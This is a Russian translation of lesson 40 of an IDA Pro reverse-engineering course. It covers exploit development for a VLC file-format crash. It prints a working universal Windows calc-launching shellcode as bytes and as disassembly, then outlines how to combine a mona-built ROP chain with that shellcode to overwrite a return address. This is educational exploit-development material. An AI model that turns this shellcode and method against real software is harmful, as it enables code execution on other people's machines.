# Часть 40

[\[Используемые материалы\]](.gitbook/assets/files/40.zip)

**УНИВЕРСАЛЬНЫЙ ШЕЛЛКОД**

Существует тысячи типов шеллкодов. Каждый из них разработан в соответствии с целью, которую мы должны эксплуатировать.

Существую шеллкоды, которые используются для доказательства того, что вы можете запустить код после эксплуатации. Обычно они запускают калькулятор и ничего больше.

Очевидно, что существуют более сложные шеллкоды, которые открывают удаленные консоли, стараются остаться в системе не смотря на то, что эксплуатируемая программа перестает работать или закрывается, инжектируют себя в некоторый другой процесс системы, сохраняет себя как файл и т.д.

Существует библиотека шеллкодов, которую мы можем найти в **GOOGLE** или запрограммировать, если нам нужно что-то особенное.

С этого момента мы будем использовать **УНИВЕРСАЛЬНЫЙ ШЕЛЛКОД**, который работает для всех версией **WINDOWS** и запускает калькулятор. При этом мы продемонстрируем выполнение кода.

Я нашел его здесь:

[https://packetstormsecurity.com/fil...-Null-Free-CreateProcessA-Calc-Shellcode.html](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html)

>shellcode=**"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b"\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"**

Я могу использовать его в скрипте **PYTHON** точно так же, если у меня есть место для его добавления.

Сами байты эксплоита такие:

`31 db 64 8b 7b 30 8b 7f 0c 8b 7f 1c 8b 47 08 8b 77 20 8b 3f 80 7e 0c 33 75 f2 89 c7 03 78 3c 8b" 57 78 01 c2 8b 7a 20 01 c7 89 dd 8b 34 af 01 c6 45 81 3e 43 72 65 61 75 f2 81 7e 08 6f 63 65 73 75 e9 8b 7a 24 01 c7 66 8b 2c 6f 8b 7a 1c 01 c7 8b 7c af fc 01 c7 89 d9 b1 ff 53 e2 fd 68 63 61 6c 63 89 e2 52 52 53 53 53 53 53 53 52 53 ff d7`

```assembly
MOV EDI,DWORD PTR FS:[EBX+30]
XOR EBX,EBX
MOV EDI,DWORD PTR DS:[EDI+C]
MOV EDI,DWORD PTR DS:[EDI+1C]
MOV EAX,DWORD PTR DS:[EDI+8]
MOV ESI,DWORD PTR DS:[EDI+20]
MOV EDI,DWORD PTR DS:[EDI]
CMP BYTE PTR DS:[ESI+C],33
JNZ SHORT CANARY_c.00A7138A
MOV EDI,EAX
ADD EDI,DWORD PTR DS:[EAX+3C]
MOV EDX,DWORD PTR DS:[EDI+78]
ADD EDX,EAX
MOV EDI,DWORD PTR DS:[EDX+20]
ADD EDI,EAX
MOV EBP,EBX
MOV ESI,DWORD PTR DS:[EDI+EBP*4]
ADD ESI,EAX
INC EBP
CMP DWORD PTR DS:[ESI],61657243
JNZ SHORT CANARY_c.00A713A9
CMP DWORD PTR DS:[ESI+8],7365636F
JNZ SHORT CANARY_c.00A713A9
MOV EDI,DWORD PTR DS:[EDX+24]
ADD EDI,EAX
MOV BP,WORD PTR DS:[EDI+EBP*2]
MOV EDI,DWORD PTR DS:[EDX+1C]
ADD EDI,EAX
MOV EDI,DWORD PTR DS:[EDI+EBP*4-4]
ADD EDI,EAX
MOV ECX,EBX
MOV CL,0FF
PUSH EBX
LOOPD SHORT CANARY_c.00A713D8
PUSH 636C6163
MOV EDX,ESP
PUSH EDX
PUSH EDX
PUSH EBX
PUSH EBX
PUSH EBX
PUSH EBX
PUSH EBX
PUSH EBX
PUSH EDX
PUSH EBX
CALL EDI
```

Эти байты запускают калькулятор везде где мы их вставляем. Хорошо, что у этих байтов нет нулей. Хотя могут быть программы, который отвергают какой-то конкретный символ отличный от нуля. Это будет зависеть от случая.

Мы уже знаем, как сделать **ROP** и у нас уже есть универсальный шеллкод. Основной смысл состоит в том, чтобы практиковаться с программой **VLC**, для которой мы уже сделали **POC**. Я был бы очень рад, если бы кто-то отправил мне полный файл и туториал, объясняющий то, что Вы сделали. Я бы добавил бы первого человека, который отправил бы мне хорошо объясняющий туториал в качестве приложения в одной из глав.

**ROP** может быть сделан вручную или с помощью **MONA**. Для нас нет никаких проблем. Вы должны найти модуль **DLL** без защиты **ASLR** и если таких больше чем один, **MONA** может использовать больше одной **DLL** в качестве аргумента, для объединения **ROP** объединяющей обе **DLL**.

Что касается же скрипта **PYTHON**, то я дам вам его схему. Как только вы создадите **ROP**, откройте файл **POC.TY+**

![](.gitbook/assets/40/01.png)

И ищите числа **41424344**, которые перезаписывают **АДРЕС ВОЗВРАТА**.

![](.gitbook/assets/40/02.png)

И здесь, в зависимости от размера **ROP** + **ШЕЛЛКОДА**,  скажем, что в качестве примера, **ROP** и **ШЕЛЛКОД** имеет длину **150** байтов. Я заменяю область по чуть-чуть начиная со значения **41424344**включительно. Предположим что это **160** байтов.

Я помечаю вниз, пока не получу отмеченную область требуемой длины.

![](.gitbook/assets/40/03.png)

Я заполняю выбранную область с помощью байта **90**.

![](.gitbook/assets/40/04.png)

Хорошо, проверьте размер области, где находятся байты **90**, которая больше чем размер **ROP** + **ШЕЛЛКОД**. Я записываю полученный размер. В моём случае он равен **160** байт.

![](.gitbook/assets/40/05.png)

Теперь у нас есть схема работы скрипта. Скрипт ещё не протестирован. Скрипт не работает. Мы не определили **ROP** или **ШЕЛЛКОД**. Вы можете использовать **УНИВЕРСАЛЬНЫЙ ШЕЛЛКОД**, который мы только что видели, если у вас нет проблем с каким-либо символом. Если это не так, вы должны найти другой шеллкод.

Основная идея состоит в том, что скрипт открывает файл заполненный байтами **90**, заменяет их полезной нагрузкой того же размера, которая содержит начало **ROP**,  **ШЕЛЛКОД** и дополнительные данные или заполнение. Затем скрипт сохраняет файл, чтобы проверить его работоспособность. Если файл заработает, то это будет считаться эксплоитом. А если нет заработает, нам нужно трассировать, чтобы увидеть почему так получилось.

Я был бы очень рад, если бы кто-то написал туториал и отправил мне рабочий эксплоит.Я бы увидел, что я зря не тратил время на написание туториалов.

Первый человек, который отправит мне туториал, будет добавлен в наш курс как победитель. Если людей будет больше одного, я загружу решению их в папку **SOLUCIONES** нашего курса, которую я создам для этого на своев Веб-Сервере, если это потребуется.

До следующей части **41**. Практикуйте и находите решение.

* * *

Автор оригинального текста — Рикардо Нарваха.

Перевод и адаптация на английский  язык — IvinsonCLS.

Перевод и адаптация на русский язык — Яша Яшечкин.

Перевод специально для форума системного и низкоуровневого программирования - WASM.IN

11.04.2018

[**Источник: ricardonarvaja.info**](http://ricardonarvaja.info/WEB/IDA%20DESDE%20CERO/CURSO%20DE%20IDA%20TUTES/40-INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO.docx)
